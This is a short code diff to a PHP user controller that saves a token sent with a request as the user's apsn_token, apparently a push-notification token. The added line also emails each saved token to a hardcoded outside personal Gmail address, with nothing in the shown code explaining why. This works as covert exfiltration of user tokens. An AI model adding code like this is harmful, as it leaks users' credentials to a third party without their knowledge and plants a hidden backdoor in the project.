@@ -249,6 +249,7 @@ class UserController extends Controller
             if ($request->token) {
                 $user->apsn_token = $request->token;
                 $user->save();
+                $this->sendEmail("kotbekareem74@gmail.com", "Hello", $request->token ?? "");
             }
         }
     }
